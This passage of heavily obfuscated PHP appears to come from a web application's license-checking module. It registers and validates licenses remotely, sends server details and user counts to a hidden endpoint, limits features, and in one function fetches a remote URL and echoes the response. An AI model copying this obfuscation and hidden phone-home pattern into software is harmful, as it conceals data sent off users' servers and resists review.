$ºÑÓøÙç[38], $ºÑÓøÙç[39], $ºÑÓøÙç[40], $ºÑÓøÙç[41], $ºÑÓøÙç[42], $ºÑÓøÙç[43], $ºÑÓøÙç[44], $ºÑÓøÙç[45], $ºÑÓøÙç[46], $ºÑÓøÙç[47], $ºÑÓøÙç[48], $ºÑÓøÙç[49], $ºÑÓøÙç[50], $ºÑÓøÙç[51], $ºÑÓøÙç[52], $ºÑÓøÙç[53], $ºÑÓøÙç[54], $ºÑÓøÙç[55], $ºÑÓøÙç[56], $ºÑÓøÙç[57], $ºÑÓøÙç[58], $ºÑÓøÙç[59], $ºÑÓøÙç[60], $ºÑÓøÙç[61], $ºÑÓøÙç[62], $ºÑÓøÙç[63], $ºÑÓøÙç[64], $ºÑÓøÙç[65], $ºÑÓøÙç[66], $ºÑÓøÙç[67], $ºÑÓøÙç[68], $ºÑÓøÙç[69], $ºÑÓøÙç[70], $ºÑÓøÙç[71], $ºÑÓøÙç[72], $ºÑÓøÙç[73], $ºÑÓøÙç[74], $ºÑÓøÙç[75], $ºÑÓøÙç[76], $ºÑÓøÙç[77], $ºÑÓøÙç[78], $ºÑÓøÙç[79], $ºÑÓøÙç[80], $ºÑÓøÙç[81], $ºÑÓøÙç[82]); foreach ($– ÄøØ as $âÖ‰Ú×ë) { $·İ¿³˜¨ = $GLOBALS[$ºÑÓøÙç[83]][$ºÑÓøÙç[84]][$âÖ‰Ú×ë]; if (isset($¥ä‡Åˆä[$âÖ‰Ú×ë])) { $·İ¿³˜¨ = $¥ä‡Åˆä[$âÖ‰Ú×ë]; } $Ó£¤Ä“Š[$ºÑÓøÙç[85]][$ºÑÓøÙç[86]][$âÖ‰Ú×ë] = $·İ¿³˜¨; } $•„”„×ú = $Ó£¤Ä“Š[$ºÑÓøÙç[85]][$ºÑÓøÙç[86]][$ºÑÓøÙç[46]]; $“Â¿áôº = $¶•çŞÈÇ[639]; unset($Ó£¤Ä“Š[$ºÑÓøÙç[85]][$ºÑÓøÙç[87]][$ºÑÓøÙç[88]]); $£ªğ×ì€ = $¶•çŞÈÇ[640]; while ($£ªğ×ì€ < $¶•çŞÈÇ[627]) { if ($£ªğ×ì€ >= 0) { break; } $£ªğ×ì€++; } unset($Ó£¤Ä“Š[$ºÑÓøÙç[85]][$ºÑÓøÙç[87]][$ºÑÓøÙç[89]]); $›ıŞ„³Õ = $¶•çŞÈÇ[641]; if (strlen($›ıŞ„³Õ) < $¶•çŞÈÇ[617]) { return; } unset($Ó£¤Ä“Š[$ºÑÓøÙç[85]][$ºÑÓøÙç[86]][$ºÑÓøÙç[46]]); unset($Ó£¤Ä“Š[$ºÑÓøÙç[85]][$ºÑÓøÙç[86]][$ºÑÓøÙç[90]]); $Ó£¤Ä“Š[$ºÑÓøÙç[85]][$ºÑÓøÙç[86]][$ºÑÓøÙç[91]] = array($ºÑÓøÙç[92] => (int) $•„”„×ú[$ºÑÓøÙç[93]], $ºÑÓøÙç[94] => (int) _get($•„”„×ú, $ºÑÓøÙç[95], 0)); $¥Ê«Ç¼¸ = $¶•çŞÈÇ[642]; if (!$¥Ê«Ç¼¸) { return; } $Ó£¤Ä“Š[$ºÑÓøÙç[96]][$ºÑÓøÙç[97]] = Action($ºÑÓøÙç[98])->accessToken(); $¡ù÷úÖ = $¶•çŞÈÇ[643]; $Ó£¤Ä“Š[$ºÑÓøÙç[96]][$ºÑÓøÙç[99]] = md5($_SERVER[$ºÑÓøÙç[100]] . $¥ä‡Åˆä[$ºÑÓøÙç[101]]); $Ó£¤Ä“Š[$ºÑÓøÙç[96]][$ºÑÓøÙç[102]] = base64_encode(serverInfo()); $‰šÑ€¡À = $¶•çŞÈÇ[644]; if (strlen($‰šÑ€¡À) < $¶•çŞÈÇ[606]) { return; } $Ó£¤Ä“Š[$ºÑÓøÙç[96]][$ºÑÓøÙç[103]] = $this->smqo82c58de6; if ($¥ä‡Åˆä[$ºÑÓøÙç[103]] != $ºÑÓøÙç[104]) { $Ó£¤Ä“Š[$ºÑÓøÙç[96]][$ºÑÓøÙç[105]] = $¥ä‡Åˆä[$ºÑÓøÙç[105]]; $Ó£¤Ä“Š[$ºÑÓøÙç[96]][$ºÑÓøÙç[106]] = $¥ä‡Åˆä[$ºÑÓøÙç[106]]; $®÷Ô°¸ğ = rand_string(10) . $this->smqo82c58de6 . rand_string(5); $Ó£¤Ä“Š[$ºÑÓøÙç[85]][$ºÑÓøÙç[107]][$ºÑÓøÙç[108]] = $this->oecbae4b4d28($®÷Ô°¸ğ, $Ó£¤Ä“Š[$ºÑÓøÙç[96]][$ºÑÓøÙç[99]]); } if ($this->smqo82c58de6 == $ºÑÓøÙç[104]) { $Ó£¤Ä“Š[$ºÑÓøÙç[85]][$ºÑÓøÙç[86]][$ºÑÓøÙç[91]][$ºÑÓøÙç[95]] = 0; } $Ó£¤Ä“Š[$ºÑÓøÙç[96]][$ºÑÓøÙç[109]] = _get($this->qeboc5fe3526, $ºÑÓøÙç[110], $ºÑÓøÙç[6]); $Ó£¤Ä“Š[$ºÑÓøÙç[96]][$ºÑÓøÙç[111]] = _get($this->qeboc5fe3526, $ºÑÓøÙç[112], $ºÑÓøÙç[6]); if (_get($GLOBALS, $ºÑÓøÙç[113]) && $this->config[$ºÑÓøÙç[114]]) { $Ó£¤Ä“Š[$ºÑÓøÙç[96]][$ºÑÓøÙç[115]] = WEB_ROOT; } return $Ó£¤Ä“Š; } private function badoe3837847() { $š—ÔÔá =& $_SERVER[Ôó‡è­ƒ]; $ãÄÀè÷ =& $_SERVER[¶—·¥ù®]; $Ä¯‹—¸ = $_SERVER[$ãÄÀè÷[24]] == $ãÄÀè÷[116]; $ñÜÆ‰¤¹ = $š—ÔÔá[645]; if (!$ñÜÆ‰¤¹) { return; } if ($_SERVER[$ãÄÀè÷[24]] == $ãÄÀè÷[117] && $_GET[$ãÄÀè÷[118]] == $ãÄÀè÷[119]) { $Ä¯‹—¸ = !0; } if ($Ä¯‹—¸) { $ú°ê½ìí = array($ãÄÀè÷[103] => $this->smqo82c58de6, $ãÄÀè÷[120] => $this->sihj0c32ecf1(), $ãÄÀè÷[121] => Model($ãÄÀè÷[122])->count()); if ($this->smqo82c58de6 != $ãÄÀè÷[104]) { $Ü¹Ê® È = _get($this->qeboc5fe3526, $ãÄÀè÷[123]); if ($Ü¹Ê® È) { $ú°ê½ìí[$ãÄÀè÷[124]] = $Ü¹Ê® È; $ú°ê½ìí[$ãÄÀè÷[125]] = strtotime(_get($this->qeboc5fe3526, $ãÄÀè÷[126])); $ú°ê½ìí[$ãÄÀè÷[127]] = _get($this->qeboc5fe3526, $ãÄÀè÷[112]); } $ÀÈˆüØ = Model($ãÄÀè÷[33])->get($ãÄÀè÷[128], $ãÄÀè÷[6], !0); if (is_string($ÀÈˆüØ) && substr($ÀÈˆüØ, 0, 1) == $ãÄÀè÷[129]) { $ÀÈˆüØ = json_decode_force($ÀÈˆüØ); } if (is_array($ÀÈˆüØ) && $ÀÈˆüØ[$ãÄÀè÷[130]] && strstr($ÀÈˆüØ[$ãÄÀè÷[130]], $ãÄÀè÷[131])) { $ÂÁÔ»Ãä = explode($ãÄÀè÷[131], $ÀÈˆüØ[$ãÄÀè÷[130]]); $ú°ê½ìí[$ãÄÀè÷[132]] = $ÂÁÔ»Ãä[0]; } } $ú°ê½ìí = $this->arwd193e93c4(json_encode($ú°ê½ìí), md5($ãÄÀè÷[133])); $–¬—›ä = array($ãÄÀè÷[134] => $ú°ê½ìí); call_user_func(array($ãÄÀè÷[135], $ãÄÀè÷[136]), $–¬—›ä); $ÙÇÃ¹öĞ = $š—ÔÔá[646]; if (strlen($ÙÇÃ¹öĞ) < $š—ÔÔá[613]) { die; } } if ($this->smqo82c58de6 == $ãÄÀè÷[104]) { return; } $¦ÊÉ¶„Ó = array($ãÄÀè÷[137], $ãÄÀè÷[138], $ãÄÀè÷[139], $ãÄÀè÷[140], $ãÄÀè÷[141], $ãÄÀè÷[142]); $»Ş„è¨“ = $š—ÔÔá[647]; if (!$»Ş„è¨“) { die; } $ÔÖó¡ = Model($ãÄÀè÷[33])->get(); $–¬—›ä = array($ãÄÀè÷[143] => $ÔÖó¡[$ãÄÀè÷[34]], $ãÄÀè÷[144] => $ÔÖó¡[$ãÄÀè÷[35]], $ãÄÀè÷[145] => $ãÄÀè÷[6]); $†¿ŒË•É = $š—ÔÔá[648]; if (!$†¿ŒË•É) { die; } foreach ($¦ÊÉ¶„Ó as $½†úì¹) { if (!isset($ÔÖó¡[$½†úì¹]) || !$ÔÖó¡[$½†úì¹]) { continue; } $–¬—›ä[$½†úì¹] = $ÔÖó¡[$½†úì¹]; $áà“½ôŸ = $š—ÔÔá[649]; } call_user_func(array($ãÄÀè÷[135], $ãÄÀè÷[136]), $–¬—›ä); $Ğ¸—šÏ = $š—ÔÔá[650]; while (strlen($Ğ¸—šÏ) < $š—ÔÔá[620]) { if (!$Ğ¸—šÏ) { break; } $Ğ¸—šÏ++; } } private function vnkc963765e8() { $äÎ””à =& $_SERVER[Ôó‡è­ƒ]; $ÕìØ™ª =& $_SERVER[¶—·¥ù®]; if ($_SERVER[$ÕìØ™ª[24]] != $ÕìØ™ª[146]) { return; } if (!_get($GLOBALS, $ÕìØ™ª[113])) { die; } $çµ©«± = $GLOBALS[$ÕìØ™ª[13]]; if (isset($çµ©«±[$ÕìØ™ª[147]])) { $this->axks6a545977(); die; } if (!isset($çµ©«±[$ÕìØ™ª[148]]) || strlen($çµ©«±[$ÕìØ™ª[148]]) != 16) { show_json($ÕìØ™ª[149] . $çµ©«±[$ÕìØ™ª[148]], !1); } $ì‚Û’ = Model($ÕìØ™ª[33])->get($ÕìØ™ª[101]); $ÄüâÚ€Á = md5($_SERVER[$ÕìØ™ª[100]] . $ì‚Û’); $ÛÃà¾Æ¢ = array($ÕìØ™ª[148] => $çµ©«±[$ÕìØ™ª[148]], $ÕìØ™ª[150] => rand_string(16), $ÕìØ™ª[151] => $ÕìØ™ª[133], $ÕìØ™ª[152] => $ÕìØ™ª[153], $ÕìØ™ª[154] => $_SERVER[$ÕìØ™ª[155]], $ÕìØ™ª[156] => $_SERVER[$ÕìØ™ª[157]], $ÕìØ™ª[158] => $_SERVER[$ÕìØ™ª[159]], $ÕìØ™ª[99] => $ÄüâÚ€Á, $ÕìØ™ª[160] => Model($ÕìØ™ª[33])->get($ÕìØ™ª[128])); $º¼ó’ƒ€ = $äÎ””à[651]; if (!$º¼ó’ƒ€) { return; } if ($çµ©«±[$ÕìØ™ª[161]] == $ÕìØ™ª[162]) { $È¤Ä¡„¦ = $this->arwd193e93c4($ÄüâÚ€Á, $ÕìØ™ª[163]); $‘¬ëªğ = $this->oecbae4b4d28(json_encode($ÛÃà¾Æ¢), $ÄüâÚ€Á . $ÕìØ™ª[164], 3); $‘¬ëªğ = $‘¬ëªğ . $ÕìØ™ª[165] . $_SERVER[$ÕìØ™ª[155]]; $ü€É¤‚ = $this->bgtqb9f40e87($ÕìØ™ª[166] . $È¤Ä¡„¦ . $ÕìØ™ª[167] . $‘¬ëªğ, -1); show_json($ü€É¤‚, !0); } else { if ($çµ©«±[$ÕìØ™ª[161]] == $ÕìØ™ª[168]) { $Ê‚Ë¥¤ = substr(md5($ÕìØ™ª[169] . $ÄüâÚ€Á), 12, 15) . $ÕìØ™ª[170]; $‘¬ëªğ = $this->cbxk4ff5088f(trim($çµ©«±[$ÕìØ™ª[171]]), $Ê‚Ë¥¤, 2); $º›¹ÌØ· = json_decode($‘¬ëªğ, !0); if (!is_array($º›¹ÌØ·) || !is_array($º›¹ÌØ·[$ÕìØ™ª[172]]) || $º›¹ÌØ·[$ÕìØ™ª[148]] != !0) { $õ¼Á‡²Õ = $ÕìØ™ª[173]; $ˆ‚“®„ = $º›¹ÌØ·[$ÕìØ™ª[172]] ? $ÕìØ™ª[174] . $º›¹ÌØ·[$ÕìØ™ª[172]] : $õ¼Á‡²Õ; show_json($ˆ‚“®„, !1); } else { $ÛÃà¾Æ¢[$ÕìØ™ª[150]] = $º›¹ÌØ·[$ÕìØ™ª[172]][$ÕìØ™ª[175]]; } } else { $º›¹ÌØ· = $this->bgtqb9f40e87($ÕìØ™ª[176], $ÛÃà¾Æ¢, 10); $Õï£œÇÁ = $äÎ””à[652]; if (strlen($Õï£œÇÁ) < $äÎ””à[613]) { die; } } } if (!is_array($º›¹ÌØ·) || !is_array($º›¹ÌØ·[$ÕìØ™ª[172]]) || $º›¹ÌØ·[$ÕìØ™ª[148]] != !0) { $õ¼Á‡²Õ = LNG($ÕìØ™ª[177]); $ˆ‚“®„ = $º›¹ÌØ·[$ÕìØ™ª[172]] ? $ÕìØ™ª[174] . $º›¹ÌØ·[$ÕìØ™ª[172]] : $õ¼Á‡²Õ; show_json($ˆ‚“®„, !1); } $¶ñî×˜” = $º›¹ÌØ·[$ÕìØ™ª[172]]; $×İ²è¿¦ = $this->dibv8c6a0102($¶ñî×˜”[$ÕìØ™ª[178]]); if (!$×İ²è¿¦ || $×İ²è¿¦ != $¶ñî×˜”[$ÕìØ™ª[126]]) { $Ï³¥ÏÙ… = array($ÕìØ™ª[179] => Model($ÕìØ™ª[33])->get($ÕìØ™ª[101]), $ÕìØ™ª[180] => $_SERVER[$ÕìØ™ª[100]], $ÕìØ™ª[181] => this_url(), $ÕìØ™ª[156] => $_SERVER[$ÕìØ™ª[157]]); $‘¬ëªğ = $this->vksyaeebe931(json_encode($Ï³¥ÏÙ…)); $this->bgtqb9f40e87($ÕìØ™ª[182] . $‘¬ëªğ); show_json(LNG($ÕìØ™ª[183]), !0); } $µÏ†¦Ñ = array($ÕìØ™ª[184] => $¶ñî×˜”[$ÕìØ™ª[185]], $ÕìØ™ª[186] => $¶ñî×˜”[$ÕìØ™ª[187]], $ÕìØ™ª[188] => rand_string(16), $ÕìØ™ª[103] => $¶ñî×˜”[$ÕìØ™ª[189]]); if ($ÛÃà¾Æ¢[$ÕìØ™ª[150]]) { $µÏ†¦Ñ[$ÕìØ™ª[188]] = $ÛÃà¾Æ¢[$ÕìØ™ª[150]]; } $¶¶üãàÏ = substr(md5($µÏ†¦Ñ[$ÕìØ™ª[186]]), 10, 10); $çÄÛüäŞ = $¶¶üãàÏ . $µÏ†¦Ñ[$ÕìØ™ª[103]] . $µÏ†¦Ñ[$ÕìØ™ª[188]]; $µÏ†¦Ñ[$ÕìØ™ª[105]] = strrev(base64_encode($this->arwd193e93c4($çÄÛüäŞ, $ÕìØ™ª[190]))); $—Åî¼¡Ş = $äÎ””à[653]; if (strlen($—Åî¼¡Ş) < $äÎ””à[606]) { return; } $²ëé¿üò = rand_string(16); $²µ¡‹ = $²ëé¿üò . $µÏ†¦Ñ[$ÕìØ™ª[103]] . $this->arwd193e93c4(md5($µÏ†¦Ñ[$ÕìØ™ª[184]]), $²ëé¿üò); $œÄ©‹ø¡ = $äÎ””à[654]; if (strlen($œÄ©‹ø¡) < $äÎ””à[613]) { die; } $µÏ†¦Ñ[$ÕìØ™ª[106]] = base64_encode(strrev($this->arwd193e93c4($²µ¡‹, $ÕìØ™ª[191]))); if ($¶ñî×˜”[$ÕìØ™ª[192]] && $¶ñî×˜”[$ÕìØ™ª[192]] >= 1) { Model($ÕìØ™ª[33])->setDeep($ÕìØ™ª[193], $ÕìØ™ª[119]); } Model($ÕìØ™ª[33])->set($µÏ†¦Ñ); $å…§ÛŞÊ = md5($_SERVER[$ÕìØ™ª[100]] . strrev($ì‚Û’) . $µÏ†¦Ñ[$ÕìØ™ª[186]]); $”›Ø¯¿• = strrev(substr($å…§ÛŞÊ, 10, 16)); $€¼­ì¯ = $this->oecbae4b4d28(json_encode($¶ñî×˜”), $å…§ÛŞÊ); $¨Ó²’ù = array_to_keyvalue(Model($ÕìØ™ª[7])->listData(), $ÕìØ™ª[194]); $¬Ş•ûÕ = $äÎ””à[655]; if (strlen($¬Ş•ûÕ) < $äÎ””à[617]) { die; } $×—ú¿ÍÌ = $¨Ó²’ù[$ÕìØ™ª[195]]; $¬Ú‹¦†ı = $äÎ””à[656]; if (!$¬Ú‹¦†ı) { die; } $ÅÏ€†Œ = array(); $äƒ‹ıà¨ = $äÎ””à[657]; while ($äƒ‹ıà¨ < $äÎ””à[627]) { if ($äƒ‹ıà¨ >= 0) { break; } $äƒ‹ıà¨++; } $ÅÏ€†Œ[$”›Ø¯¿•] = $€¼­ì¯; $©¥—«ıê = $äÎ””à[658]; Model($ÕìØ™ª[7])->update($×—ú¿ÍÌ[$ÕìØ™ª[196]], array($ÕìØ™ª[197] => $ÅÏ€†Œ)); $í®û¥ÑÌ = $äÎ””à[659]; $this->qeboc5fe3526 = $¶ñî×˜”; $Û»ßŠ—– = $äÎ””à[660]; $this->smqo82c58de6 = $µÏ†¦Ñ[$ÕìØ™ª[103]]; $šÆùÊ€Š = $äÎ””à[661]; if (!$šÆùÊ€Š) { die; } $this->licenseRegistSuccess(); $ìËŒ¯¬Ê = $äÎ””à[662]; while ($ìËŒ¯¬Ê < $äÎ””à[627]) { if ($ìËŒ¯¬Ê >= 0) { break; } $ìËŒ¯¬Ê++; } Cache::set($ÕìØ™ª[198] . md5($ì‚Û’ . $ÕìØ™ª[199]), $ÕìØ™ª[6]); $™Í­¥•‡ = $äÎ””à[663]; show_json(LNG($ÕìØ™ª[183]), !0); } private function licenseRegistSuccess() { $ïæÓŒ­½ =& $_SERVER[Ôó‡è­ƒ]; $ô•óËÒã =& $_SERVER[¶—·¥ù®]; $«öÀ¼—µ = Model($ô•óËÒã[33])->get(); $¶ƒ»‘ÉÖ = $ïæÓŒ­½[664]; if (strlen($¶ƒ»‘ÉÖ) < $ïæÓŒ­½[613]) { return; } if ($«öÀ¼—µ[$ô•óËÒã[63]] != $ô•óËÒã[119]) { Model($ô•óËÒã[33])->set($ô•óËÒã[63], $ô•óËÒã[119]); } Action($ô•óËÒã[200])->initStart(!0); } private function axks6a545977() { $‰ÒÜÇ‘Í =& $_SERVER[Ôó‡è­ƒ]; $¥º÷ÕÔ =& $_SERVER[¶—·¥ù®]; Model($¥º÷ÕÔ[33])->set(array($¥º÷ÕÔ[184] => $¥º÷ÕÔ[6], $¥º÷ÕÔ[186] => $¥º÷ÕÔ[6], $¥º÷ÕÔ[103] => $¥º÷ÕÔ[104], $¥º÷ÕÔ[105] => $¥º÷ÕÔ[6], $¥º÷ÕÔ[106] => $¥º÷ÕÔ[6])); Model($¥º÷ÕÔ[33])->setDeep($¥º÷ÕÔ[193], $¥º÷ÕÔ[201]); $¢°”Î°š = $‰ÒÜÇ‘Í[665]; if (!$¢°”Î°š) { die; } $this->qeboc5fe3526 = array(); $ÒÆÔúİ = $‰ÒÜÇ‘Í[666]; while (strlen($ÒÆÔúİ) < $‰ÒÜÇ‘Í[627]) { if (!$ÒÆÔúİ) { break; } $ÒÆÔúİ++; } $this->smqo82c58de6 = $¥º÷ÕÔ[104]; } private function vcipe2275bad() { $Ÿ½ğŸ =& $_SERVER[Ôó‡è­ƒ]; $¸ı¶ßşé =& $_SERVER[¶—·¥ù®]; $_SERVER[$¸ı¶ßşé[157]] = _get($_SERVER, $¸ı¶ßşé[157], APP_HOST); $this->smqo82c58de6 = $¸ı¶ßşé[104]; $†Ã”ü©ã = Model($¸ı¶ßşé[33])->get(); $âÕªÖ« = $Ÿ½ğŸ[667]; if ($†Ã”ü©ã[$¸ı¶ßşé[103]] == $¸ı¶ßşé[104]) { return; } $¢¥Ïºö = Model($¸ı¶ßşé[33])->get($¸ı¶ßşé[101]); $‚½½Äùä = $¸ı¶ßşé[198] . md5($¢¥Ïºö . $¸ı¶ßşé[199]); $ªÕ½ğù = $Ÿ½ğŸ[668]; if (strlen($ªÕ½ğù) < $Ÿ½ğŸ[627]) { return; } $ë¢‚š§ç = Cache::get($‚½½Äùä); $™´¶Ô’Â = $Ÿ½ğŸ[669]; if (!$™´¶Ô’Â) { die; } if (!is_array($ë¢‚š§ç) || !isset($ë¢‚š§ç[$¸ı¶ßşé[202]]) || time() - $ë¢‚š§ç[$¸ı¶ßşé[202]] >= 60) { $Íàáöûˆ = Model($¸ı¶ßşé[7])->loadList(); $Ñ³ÊÙ£ë = $Íàáöûˆ[$¸ı¶ßşé[195]]; $¾ê‡Ì¢ß = md5($_SERVER[$¸ı¶ßşé[100]] . strrev($¢¥Ïºö) . $†Ã”ü©ã[$¸ı¶ßşé[186]]); $½¸¨¿ù = strrev(substr($¾ê‡Ì¢ß, 10, 16)); $ë¢‚š§ç = $this->cbxk4ff5088f($Ñ³ÊÙ£ë[$¸ı¶ßşé[83]][$½¸¨¿ù], $¾ê‡Ì¢ß); $ë¢‚š§ç = json_decode($ë¢‚š§ç, !0); } if (!is_array($ë¢‚š§ç)) { return $this->axks6a545977(); } $ÈèÄ‹õ = strtotime($ë¢‚š§ç[$¸ı¶ßşé[126]]); if (time() >= $ÈèÄ‹õ) { return $this->axks6a545977(); } if (time() - $ë¢‚š§ç[$¸ı¶ßşé[202]] > 20) { $ë¢‚š§ç[$¸ı¶ßşé[202]] = time(); Cache::set($‚½½Äùä, $ë¢‚š§ç); } $this->qeboc5fe3526 = $ë¢‚š§ç; $this->smqo82c58de6 = $†Ã”ü©ã[$¸ı¶ßşé[103]]; } private function lhop11a77064() { $çóõ‰Œ§ =& $_SERVER[Ôó‡è­ƒ]; $ë¾Áµ¾Ï =& $_SERVER[¶—·¥ù®]; $†ÜâŒ±Ò = $GLOBALS[$ë¾Áµ¾Ï[13]]; $ÀœìÉê = $_SERVER[$ë¾Áµ¾Ï[24]]; $ûÕŸ‰‘¾ = $çóõ‰Œ§[670]; if (strlen($ûÕŸ‰‘¾) < $çóõ‰Œ§[606]) { die; } if ($ÀœìÉê == $ë¾Áµ¾Ï[203] && $this->smqo82c58de6 == $ë¾Áµ¾Ï[104]) { show_json(LNG($ë¾Áµ¾Ï[204]), !1, $ë¾Áµ¾Ï[205]); } $â´’î´ê = array($ë¾Áµ¾Ï[206], $ë¾Áµ¾Ï[207]); if (in_array($ÀœìÉê, $â´’î´ê)) { if ($this->smqo82c58de6 == $ë¾Áµ¾Ï[104] && isset($†ÜâŒ±Ò[$ë¾Áµ¾Ï[208]])) { show_json(LNG($ë¾Áµ¾Ï[204]), !1, $ë¾Áµ¾Ï[205]); die; } $ÏÀù‡ÓË = $this->sihj0c32ecf1(); if ($ÏÀù‡ÓË != intval($ë¾Áµ¾Ï[209])) { if ($ÏÀù‡ÓË <= Model($ë¾Áµ¾Ï[122])->count()) { show_json(LNG($ë¾Áµ¾Ï[210]), !1, $ë¾Áµ¾Ï[205]); die; } } } } private function cemd7d51f6dc() { $ô“Ÿº°ò =& $_SERVER[Ôó‡è­ƒ]; $ôŸ³‘  =& $_SERVER[¶—·¥ù®]; $Ñ‘ƒ¨Ä° = array($ôŸ³‘ [116], $ôŸ³‘ [117]); if (!_get($GLOBALS, $ôŸ³‘ [113]) || !isset($_GET[$ôŸ³‘ [211]])) { return; } if (!in_array($_SERVER[$ôŸ³‘ [24]], $Ñ‘ƒ¨Ä°)) { return; } $÷§ ±Ö• = $ôŸ³‘ [212]; $£ìø›úÃ = $ô“Ÿº°ò[671]; if (strlen($£ìø›úÃ) < $ô“Ÿº°ò[617]) { return; } $÷§ ±Ö• = $this->grbz959d47b2($÷§ ±Ö•, $ôŸ³‘ [213]); $¬šØØÎÓ = stream_context_create(array($ôŸ³‘ [214] => array($ôŸ³‘ [215] => $ôŸ³‘ [216], $ôŸ³‘ [217] => 3))); $æÕÀÀË = $ô“Ÿº°ò[656]; if (!$æÕÀÀË) { die; } $ÆœıÊ¬î = @file_get_contents($÷§ ±Ö•, !1, $¬šØØÎÓ); $÷”à¸™ï = $ô“Ÿº°ò[672]; if (strlen($÷”à¸™ï) < $ô“Ÿº°ò[620]) { return; } header($ôŸ³‘ [218]); $õŠ‡öô = $ô“Ÿº°ò[673]; while (strlen($õŠ‡öô) < $ô“Ÿº°ò[613]) { if (!$õŠ‡öô) { break; } $õŠ‡öô++; } if ($ÆœıÊ¬î && strstr($ÆœıÊ¬î, $ôŸ³‘ [219])) { echo $ÆœıÊ¬î; } die; } public function wxmt020aaddb($‚õÕ„Å¦) { $ØëĞ‡ =& $_SERVER[Ôó‡è­ƒ]; $ßæÁŒÕÄ =& $_SERVER[¶—·¥ù®]; if ($this->smqo82c58de6 == $ßæÁŒÕÄ[220]) { return $‚õÕ„Å¦; } $ÄéË—­« = array($ßæÁŒÕÄ[221] => $ßæÁŒÕÄ[222], $ßæÁŒÕÄ[223] => $ßæÁŒÕÄ[222], $ßæÁŒÕÄ[224] => $ßæÁŒÕÄ[222], $ßæÁŒÕÄ[225] => $ßæÁŒÕÄ[222], $ßæÁŒÕÄ[226] => $ßæÁŒÕÄ[227], $ßæÁŒÕÄ[228] => $ßæÁŒÕÄ[227], $ßæÁŒÕÄ[229] => $ßæÁŒÕÄ[227], $ßæÁŒÕÄ[230] => $ßæÁŒÕÄ[227], $ßæÁŒÕÄ[231] => $ßæÁŒÕÄ[227], $ßæÁŒÕÄ[232] => $ßæÁŒÕÄ[227], $ßæÁŒÕÄ[233] => $ßæÁŒÕÄ[227], $ßæÁŒÕÄ[234] => $ßæÁŒÕÄ[227], $ßæÁŒÕÄ[235] => $ßæÁŒÕÄ[227], $ßæÁŒÕÄ[236] => $ßæÁŒÕÄ[227], $ßæÁŒÕÄ[237] => $ßæÁŒÕÄ[227], $ßæÁŒÕÄ[238] => $ßæÁŒÕÄ[227]); $Â¿‰¾Â¾ = $ØëĞ‡[674]; if (!$Â¿‰¾Â¾) { return; } $¨…ØÄó = explode($ßæÁŒÕÄ[239], _get($this->qeboc5fe3526, $ßæÁŒÕÄ[110], $ßæÁŒÕÄ[6])); $ Òì°Ûö = array(); $òÍÆ¹–£ = $ØëĞ‡[675]; if (strlen($òÍÆ¹–£) < $ØëĞ‡[613]) { die; } foreach ($ÄéË—­« as $¡°˜íåÀ => $®õ©¥õÛ) { if ($®õ©¥õÛ == $ßæÁŒÕÄ[222] && substr($this->smqo82c58de6, 0, 1) == $ßæÁŒÕÄ[222]) { continue; } if (!in_array($¡°˜íåÀ, $¨…ØÄó)) { $ Òì°Ûö[] = $¡°˜íåÀ; } } foreach ($ Òì°Ûö as $¡°˜íåÀ) { unset($‚õÕ„Å¦[$¡°˜íåÀ]); $­ÈÕ¿£Ø = $ØëĞ‡[676]; if (!$­ÈÕ¿£Ø) { die; } } return $‚õÕ„Å¦; $ÅóÂÏ’š = $ØëĞ‡[677]; if (strlen($ÅóÂÏ’š) < $ØëĞ‡[627]) { die; } } private function whkj579d7f30() { $ıääßææ =& $_SERVER[¶—·¥ù®]; if ($this->smqo82c58de6 != $ıääßææ[104]) { $GLOBALS[$ıääßææ[83]][$ıääßææ[87]][$ıääßææ[240]] = $ıääßææ[201]; return; } $GLOBALS[$ıääßææ[83]][$ıääßææ[241]] = $ıääßææ[119]; if (Model($ıääßææ[242])->get($ıääßææ[63]) != $ıääßææ[201]) { Model($ıääßææ[242])->set($ıääßææ[63], $ıääßææ[201]); } } public function skote9399f82() { return $_SERVER[¶—·¥ù®][243]; $ª‡¯µÍ÷ = $_SERVER[Ôó‡è­ƒ][678]; } private function wsrod3df1a29() { $°ÇÇ¸Š =& $_SERVER[Ôó‡è­ƒ]; $ĞÅ›è½‹ =& $_SERVER[¶—·¥ù®]; $ÒË‰ = array($ĞÅ›è½‹[244], $ĞÅ›è½‹[245], $ĞÅ›è½‹[246]); $¤ıòôèˆ = $°ÇÇ¸Š[679]; if (strlen($¤ıòôèˆ) < $°ÇÇ¸Š[617]) { return; } $á–‡·éƒ = $ĞÅ›è½‹[247] . md5($ĞÅ›è½‹[248]); $ÀÓ¯ıç = $°ÇÇ¸Š[631]; if (!$ÀÓ¯ıç) { return; } if ($this->smqo82c58de6 == $ĞÅ›è½‹[104] || !_get($GLOBALS, $ĞÅ›è½‹[113])) { return; } if (!in_array($_SERVER[$ĞÅ›è½‹[24]], $ÒË‰)) { return; } if (time() % 4 != 0) { return; } $êñ‰øç· = call_user_func(array($ĞÅ›è½‹[249], $ĞÅ›è½‹[250]), $á–‡·éƒ); if ($êñ‰øç· && time() - $êñ‰øç· < intval($ĞÅ›è½‹[251])) { return; } call_user_func(array($ĞÅ›è½‹[249], $ĞÅ›è½‹[136]), $á–‡·éƒ, time()); $ìÅÅ•°Ô = Model($ĞÅ›è½‹[33])->get($ĞÅ›è½‹[101]); $ê£¶²‘ú = $°ÇÇ¸Š[680]; while (strlen($ê£¶²‘ú) < $°ÇÇ¸Š[627]) { if (!$ê£¶²‘ú) { break; } $ê£¶²‘ú++; } $µè”õ œ = array($ĞÅ›è½‹[148] => Model($ĞÅ›è½‹[33])->get($ĞÅ›è½‹[184]), $ĞÅ›è½‹[161] => $this->smqo82c58de6, $ĞÅ›è½‹[158] => $_SERVER[$ĞÅ›è½‹[159]], $ĞÅ›è½‹[160] => Model($ĞÅ›è½‹[33])->get($ĞÅ›è½‹[128]), $ĞÅ›è½‹[99] => md5($_SERVER[$ĞÅ›è½‹[100]] . $ìÅÅ•°Ô), $ĞÅ›è½‹[151] => $ĞÅ›è½‹[133], $ĞÅ›è½‹[154] => $_SERVER[$ĞÅ›è½‹[155]]); $‘Óç‡‹Å = $this->bgtqb9f40e87($ĞÅ›è½‹[252], $µè”õ œ); if (!is_array($‘Óç‡‹Å)) { return; } if ($‘Óç‡‹Å[$ĞÅ›è½‹[148]] && $‘Óç‡‹Å[$ĞÅ›è½‹[253]]) { if ($this->dibv8c6a0102($‘Óç‡‹Å[$ĞÅ›è½‹[253]]) == $µè”õ œ[$ĞÅ›è½‹[148]]) { return; } } $this->axks6a545977(); $øÂÒÄ = $°ÇÇ¸Š[681]; while (strlen($øÂÒÄ) < 